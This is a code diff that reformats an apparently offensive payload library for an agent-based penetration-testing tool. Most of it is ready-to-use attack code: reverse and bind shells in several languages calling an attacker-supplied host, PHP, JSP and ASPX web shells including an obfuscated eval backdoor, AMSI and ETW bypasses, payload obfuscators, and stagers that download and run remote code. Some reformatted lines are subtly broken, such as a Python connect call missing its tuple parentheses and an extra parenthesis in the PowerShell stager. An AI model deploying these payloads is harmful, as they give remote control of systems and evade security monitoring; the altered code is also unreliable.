@@ -28,8 +28,6 @@ except ImportError:
 class PayloadError(Exception):
     """Custom exception for payload errors"""
 
-    pass
-
 
 def check_payload_preconditions(state: "AgentState") -> tuple[bool, str]:
     """
@@ -257,9 +255,11 @@ def execute_command(state: "AgentState"):
     logger.error("Direct command execution attempted - BLOCKED")
     if state is None:
         raise RuntimeError("State is required for payload command execution")
-    # Direct command execution is forbidden; must use ToolSelector via agent tool execution path
+    # Direct command execution is forbidden; must use ToolSelector via
+    # agent tool execution path
     raise RuntimeError(
-        "Direct command execution is forbidden. Use ToolSelector via the agent executor."
+        "Direct command execution is forbidden. "
+        "Use ToolSelector via the agent executor."
     )
 
 
@@ -314,13 +314,25 @@ PAYLOAD_TEMPLATES = {
         "requires": ["bash"],
     },
     "reverse_shell_python": {
-        "code": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'""",
+        "code": (
+            "python3 -c 'import socket,subprocess,os;"
+            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+            "s.connect(\"{lhost}\",{lport});"
+            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
+            "os.dup2(s.fileno(),2);"
+            "subprocess.call([\"/bin/sh\",\"-i\"])'"
+        ),
         "description": "Python reverse shell",
         "os": "linux",
         "requires": ["python3"],
     },
     "reverse_shell_python_windows": {
-        "code": '''python -c "import socket,subprocess;s=socket.socket();s.connect(('{lhost}',{lport}));[subprocess.Popen(['cmd.exe'],stdin=s,stdout=s,stderr=s)]"''',
+        "code": (
+            "python -c \"import socket,subprocess;"
+            "s=socket.socket();"
+            "s.connect(('{lhost}',{lport}));"
+            "[subprocess.Popen(['cmd.exe'],stdin=s,stdout=s,stderr=s)]\""
+        ),
         "description": "Python reverse shell for Windows",
         "os": "windows",
         "requires": ["python"],
@@ -332,55 +344,104 @@ PAYLOAD_TEMPLATES = {
         "requires": ["nc"],
     },
     "reverse_shell_nc_mkfifo": {
-        "code": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
+        "code": (
+            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
+            "nc {lhost} {lport} >/tmp/f"
+        ),
         "description": "Netcat reverse shell with mkfifo (no -e flag)",
         "os": "linux",
         "requires": ["nc", "mkfifo"],
     },
     "reverse_shell_perl": {
-        "code": """perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'\'""",
+        "code": (
+            "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
+            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
+            "open(STDIN,\">&S\");open(STDOUT,\">&S\");"
+            "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
+        ),
         "description": "Perl reverse shell",
         "os": "linux",
         "requires": ["perl"],
     },
     "reverse_shell_php": {
-        "code": """php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'\'""",
+        "code": (
+            "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
+            "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        ),
         "description": "PHP reverse shell",
         "os": "linux",
         "requires": ["php"],
     },
     "reverse_shell_ruby": {
-        "code": """ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'\'""",
+        "code": (
+            "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
+            "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+        ),
         "description": "Ruby reverse shell",
         "os": "linux",
         "requires": ["ruby"],
     },
     "reverse_shell_powershell": {
-        "code": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
+        "code": (
+            "powershell -nop -c \""
+            "$client = New-Object System.Net.Sockets.TCPClient("
+            "'{lhost}',{lport});"
+            "$stream = $client.GetStream();"
+            "[byte[]]$bytes = 0..65535|%{{0}};"
+            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
+            ";$data = (New-Object -TypeName System.Text."
+            "ASCIIEncoding).GetString($bytes,0, $i);"
+            "$sendback = (iex $data 2>&1 | Out-String );"
+            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
+            "$sendbyte = ([text.encoding]::ASCII).GetBytes("
+            "$sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);"
+            "$stream.Flush()}};$client.Close()\""
+        ),
         "description": "PowerShell reverse shell",
         "os": "windows",
         "requires": ["powershell"],
     },
     "web_shell_php": {
-        "code": """<?php if(isset($_REQUEST['cmd'])){{ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }} ?>""",
+        "code": (
+            "<?php if(isset($_REQUEST['cmd'])){{ echo \"<pre>\"; "
+            "$cmd = ($_REQUEST['cmd']); system($cmd); "
+            "echo \"</pre>\"; die; }} ?>"
+        ),
         "description": "Simple PHP web shell",
         "os": "any",
         "requires": ["php"],
     },
     "web_shell_php_advanced": {
-        "code": """<?php $k="drakben";if(isset($_POST[$k])){{@eval(base64_decode($_POST[$k]));}} ?>""",
+        "code": (
+            "<?php $k=\"drakben\";"
+            "if(isset($_POST[$k])){{@eval(base64_decode($_POST[$k]));}} ?>"
+        ),
         "description": "Obfuscated PHP web shell",
         "os": "any",
         "requires": ["php"],
     },
     "web_shell_jsp": {
-        "code": """<%@ page import="java.util.*,java.io.*"%><% String cmd = request.getParameter("cmd"); if(cmd != null) {{ Process p = Runtime.getRuntime().exec(cmd); DataInputStream in = new DataInputStream(p.getInputStream()); String s = null; while((s = in.readLine()) != null) {{ out.println(s); }} }} %>""",
+        "code": (
+            "<%@ page import=\"java.util.*,java.io.*\"%>"
+            "<% String cmd = request.getParameter(\"cmd\"); if(cmd != null) {{ "
+            "Process p = Runtime.getRuntime().exec(cmd); DataInputStream in = "
+            "new DataInputStream(p.getInputStream()); String s = null; "
+            "while((s = in.readLine()) != null) {{ out.println(s); }} }} %>"
+        ),
         "description": "JSP web shell",
         "os": "any",
         "requires": ["java"],
     },
     "web_shell_aspx": {
-        "code": """<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% string cmd = Request["cmd"]; if(!string.IsNullOrEmpty(cmd)) {{ Process p = new Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + cmd; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); }} %>""",
+        "code": (
+            "<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %>"
+            "<% string cmd = Request[\"cmd\"]; if(!string.IsNullOrEmpty(cmd)) {{ "
+            "Process p = new Process(); p.StartInfo.FileName = \"cmd.exe\"; "
+            "p.StartInfo.Arguments = \"/c \" + cmd; p.StartInfo.UseShellExecute = false; "
+            "p.StartInfo.RedirectStandardOutput = true; p.Start(); "
+            "Response.Write(p.StandardOutput.ReadToEnd()); }} %>"
+        ),
         "description": "ASPX web shell",
         "os": "windows",
         "requires": ["aspx"],
@@ -392,7 +453,13 @@ PAYLOAD_TEMPLATES = {
         "requires": ["nc"],
     },
     "bind_shell_python": {
-        "code": """python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",{lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'\'""",
+        "code": (
+            "python3 -c 'import socket,subprocess,os;"
+            "s=socket.socket();s.bind((\"0.0.0.0\",{lport}));"
+            "s.listen(1);c,a=s.accept();"
+            "os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);"
+            "os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"] )'"
+        ),
         "description": "Python bind shell",
         "os": "linux",
         "requires": ["python3"],
@@ -610,7 +677,7 @@ class PayloadObfuscator:
         """
         if language == "bash":
             return _polymorphic_encode_bash(payload)
-        elif language == "python":
+        if language == "python":
             return _polymorphic_encode_python(payload)
         return payload  # Fallback for unknown langs
 
@@ -712,7 +779,11 @@ class PowerShellObfuscator:
     def environment_variable(payload: str, var_name: str = "x") -> str:
         """Store in environment variable"""
         encoded = PayloadObfuscator.base64_encode(payload)
-        return f'$env:{var_name}="{encoded}";iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:{var_name})))'
+        return (
+            f'$env:{var_name}="{encoded}";'
+            f'iex([System.Text.Encoding]::UTF8.GetString('
+            f'[System.Convert]::FromBase64String($env:{var_name})))'
+        )
 
     @staticmethod
     def tick_obfuscation(payload: str) -> str:
@@ -783,16 +854,34 @@ class AVBypass:
         # Common AMSI bypass (for educational purposes)
         bypasses = [
             # Reflection-based
-            '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
+            (
+                '[Ref].Assembly.GetType("System.Management.Automation.'
+                'AmsiUtils")'
+                '.GetField("amsiInitFailed","NonPublic,Static")'
+                '.SetValue($null,$true)'
+            ),
             # Memory patching approach (conceptual)
-            '$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields("NonPublic,Static");ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)',
+            (
+                '$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils")'
+                '{$c=$b}};$d=$c.GetFields("NonPublic,Static");ForEach($e in $d)'
+                '{if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr'
+                '=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy'
+                '($buf,0,$ptr,1)'
+            ),
         ]
         return bypasses[0]
 
     @staticmethod
     def etw_bypass_powershell() -> str:
         """Generate ETW bypass for PowerShell"""
-        return '[Reflection.Assembly]::LoadWithPartialName("System.Core").GetType("System.Diagnostics.Eventing.EventProvider").GetField("m_enabled","NonPublic,Instance").SetValue([Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider","NonPublic,Static").GetValue($null),0)'
+        return (
+            '[Reflection.Assembly]::LoadWithPartialName("System.Core")'
+            '.GetType("System.Diagnostics.Eventing.EventProvider")'
+            '.GetField("m_enabled","NonPublic,Instance")'
+            '.SetValue('
+            '[Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider")'
+            '.GetField("etwProvider","NonPublic,Static").GetValue($null),0)'
+        )
 
     @staticmethod
     def windows_defender_exclusion_check() -> str:
@@ -883,18 +972,18 @@ def _apply_obfuscation_technique(
     """Apply a single obfuscation technique"""
     if technique == "base64":
         return _apply_base64_obfuscation(payload, language), "base64"
-    elif technique == "hex":
+    if technique == "hex":
         return _apply_hex_obfuscation(payload, language), "hex"
-    elif technique == "xor":
+    if technique == "xor":
         encoded, key = PayloadObfuscator.xor_encode(payload)
         return f"XOR_KEY={key}\nENCODED={encoded}", f"xor_key_{key}"
-    elif technique == "variable":
+    if technique == "variable":
         return PayloadObfuscator.variable_substitution(payload), "variable_substitution"
-    elif technique == "dead_code":
+    if technique == "dead_code":
         return PayloadObfuscator.dead_code_injection(payload, language), "dead_code"
-    elif technique == "concat":
+    if technique == "concat":
         return _apply_concat_obfuscation(payload, language), "string_concat"
-    elif technique == "tick" and language == "powershell":
+    if technique == "tick" and language == "powershell":
         return PowerShellObfuscator.tick_obfuscation(payload), "tick_obfuscation"
     return payload, None
 
@@ -903,7 +992,7 @@ def _apply_base64_obfuscation(payload: str, language: str) -> str:
     """Apply base64 obfuscation based on language"""
     if language == "bash":
         return BashObfuscator.eval_base64(payload)
-    elif language == "powershell":
+    if language == "powershell":
         return PowerShellObfuscator.invoke_expression_encode(payload)
     return PayloadObfuscator.base64_encode(payload)
 
@@ -923,7 +1012,11 @@ def _apply_concat_obfuscation(payload: str, language: str) -> str:
 
 
 def generate_staged_payload(
-    state: "AgentState", payload_type: str, lhost: str, lport: int, stage_url: str
+    state: "AgentState",
+    payload_type: str,
+    lhost: str,
+    lport: int,
+    stage_url: str,
 ) -> dict[str, Any]:
     """
     Generate staged payload with stager and stage.
@@ -941,9 +1034,14 @@ def generate_staged_payload(
 
     # Stagers (small code to fetch and execute stage)
     stagers = {
-        "powershell": f'IEX(New-Object Net.WebClient).DownloadString("{stage_url}")',
+        "powershell": (
+            f'IEX(New-Object Net.WebClient).DownloadString("{stage_url}"))'
+        ),
         "bash": f"curl -s {stage_url} | bash",
-        "python": f'import urllib.request; exec(urllib.request.urlopen("{stage_url}").read())',
+        "python": (
+            f'import urllib.request; '
+            f'exec(urllib.request.urlopen("{stage_url}").read())'
+        ),
     }
 
     # Get main payload
